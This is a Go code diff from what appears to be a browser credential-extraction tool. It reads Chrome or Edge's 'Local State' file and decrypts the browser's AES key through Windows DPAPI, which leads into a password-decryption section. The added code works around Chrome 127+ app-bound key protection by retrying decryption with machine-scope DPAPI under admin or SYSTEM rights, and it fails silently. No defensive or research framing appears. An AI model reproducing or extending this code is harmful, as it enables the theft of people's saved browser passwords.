@@ -52,6 +52,41 @@ func dpapi(data []byte) ([]byte, error) {
 
 // ── Chrome AES key ────────────────────────────────────────────────────────────
 
+// dpapiLocalMachine calls CryptUnprotectData with CRYPTPROTECT_LOCAL_MACHINE (0x4).
+// This allows decryption of machine-scope DPAPI blobs; requires admin/SYSTEM privileges.
+func dpapiLocalMachine(data []byte) ([]byte, error) {
+	if len(data) == 0 {
+		return nil, fmt.Errorf("empty input")
+	}
+	in := dataBlob{cbData: uint32(len(data)), pbData: &data[0]}
+	var out dataBlob
+	const cryptProtectLocalMachine = 4
+	ret, _, err := cryptUnprotectData.Call(
+		uintptr(unsafe.Pointer(&in)),
+		0, 0, 0, 0, cryptProtectLocalMachine,
+		uintptr(unsafe.Pointer(&out)),
+	)
+	if ret == 0 {
+		return nil, fmt.Errorf("CryptUnprotectData(machine): %w", err)
+	}
+	defer localFree.Call(uintptr(unsafe.Pointer(out.pbData)))
+	result := make([]byte, out.cbData)
+	copy(result, (*[1 << 30]byte)(unsafe.Pointer(out.pbData))[:out.cbData])
+	return result, nil
+}
+
+// extractAppBoundKey pulls the 32-byte AES key out of a decrypted app-bound blob.
+// Chrome may prepend a 1-byte version number to the raw key.
+func extractAppBoundKey(plain []byte) []byte {
+	if len(plain) == 32 {
+		return plain
+	}
+	if len(plain) >= 33 {
+		return plain[1:33]
+	}
+	return nil
+}
+
 func getChromeAESKey(userDataDir string) ([]byte, error) {
 	data, err := os.ReadFile(filepath.Join(userDataDir, "Local State"))
 	if err != nil {
@@ -59,23 +94,42 @@ func getChromeAESKey(userDataDir string) ([]byte, error) {
 	}
 	var ls struct {
 		OSCrypt struct {
-			EncryptedKey string `json:"encrypted_key"`
+			EncryptedKey         string `json:"encrypted_key"`
+			AppBoundEncryptedKey string `json:"app_bound_encrypted_key"`
 		} `json:"os_crypt"`
 	}
 	if err := json.Unmarshal(data, &ls); err != nil {
 		return nil, err
 	}
-	if ls.OSCrypt.EncryptedKey == "" {
-		return nil, fmt.Errorf("no encrypted_key")
+
+	// Standard DPAPI-protected key (v10, Chrome/Edge < 127).
+	if ls.OSCrypt.EncryptedKey != "" {
+		keyEnc, err := base64.StdEncoding.DecodeString(ls.OSCrypt.EncryptedKey)
+		if err == nil && len(keyEnc) >= 5 && string(keyEnc[:5]) == "DPAPI" {
+			if key, err := dpapi(keyEnc[5:]); err == nil {
+				return key, nil
+			}
+		}
 	}
-	keyEnc, err := base64.StdEncoding.DecodeString(ls.OSCrypt.EncryptedKey)
-	if err != nil {
-		return nil, err
+
+	// App-bound encrypted key (v20, Chrome/Edge 127+).
+	// Decryption requires admin/SYSTEM; silently skipped if unavailable.
+	if ls.OSCrypt.AppBoundEncryptedKey != "" {
+		keyEnc, err := base64.StdEncoding.DecodeString(ls.OSCrypt.AppBoundEncryptedKey)
+		if err == nil && len(keyEnc) > 4 && string(keyEnc[:4]) == "APPB" {
+			payload := keyEnc[4:]
+			// Try user-scope first, then machine-scope.
+			for _, tryFn := range []func([]byte) ([]byte, error){dpapi, dpapiLocalMachine} {
+				if plain, err := tryFn(payload); err == nil {
+					if key := extractAppBoundKey(plain); key != nil {
+						return key, nil
+					}
+				}
+			}
+		}
 	}
-	if len(keyEnc) < 5 || string(keyEnc[:5]) != "DPAPI" {
-		return nil, fmt.Errorf("unexpected prefix")
-	}
-	return dpapi(keyEnc[5:])
+
+	return nil, fmt.Errorf("no decryptable AES key found in Local State")
 }
 
 // ── Password decryption ───────────────────────────────────────────────────────
